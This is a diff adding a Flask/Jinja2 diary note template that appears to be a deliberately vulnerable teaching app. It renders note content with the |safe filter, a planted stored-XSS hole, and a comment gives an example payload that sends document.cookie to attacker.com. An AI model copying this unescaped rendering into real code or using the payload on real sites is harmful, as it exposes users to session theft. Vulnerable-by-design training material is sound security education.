@@ -1,0 +1,45 @@
+{% extends "base.html" %}
+{% block title %}{{ note[1] }} — Personal Diary{% endblock %}
+
+{% set mood_emoji = {
+  'happy':   '😊',
+  'sad':     '😢',
+  'neutral': '😐',
+  'excited': '🤩',
+  'anxious': '😰',
+  'calm':    '😌'
+} %}
+
+{% block content %}
+<a href="{{ url_for('dashboard') }}" class="back-link">← Back to Dashboard</a>
+
+<div class="card" style="max-width:720px;">
+  <div class="note-view-header">
+    <div>
+      <h1 class="note-view-title">{{ note[1] }}</h1>
+      <div style="display:flex;align-items:center;gap:0.75rem;margin-top:0.5rem;">
+        <span class="mood-badge mood-{{ note[3] }}">
+          {{ mood_emoji.get(note[3], '😐') }} {{ note[3]|capitalize }}
+        </span>
+        <span class="note-meta">{{ note[4].strftime('%B %d, %Y at %H:%M') }}</span>
+      </div>
+    </div>
+    <form method="POST" action="{{ url_for('delete_note', note_id=note[0]) }}">
+      <button type="submit" class="btn btn-danger btn-sm"
+              onclick="return confirm('Delete this entry permanently?')">
+        Delete
+      </button>
+    </form>
+  </div>
+
+  <!--
+    VULNERABILITY: XSS — Stored Cross-Site Scripting
+    The note content is rendered as raw HTML using Jinja2's |safe filter.
+    Any HTML/JavaScript saved by an attacker in the note will execute in
+    the browser of anyone who views the note.
+    Example payload stored as note content:
+      <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+  -->
+  <div class="note-content">{{ note[2] | safe }}</div>
+</div>
+{% endblock %}
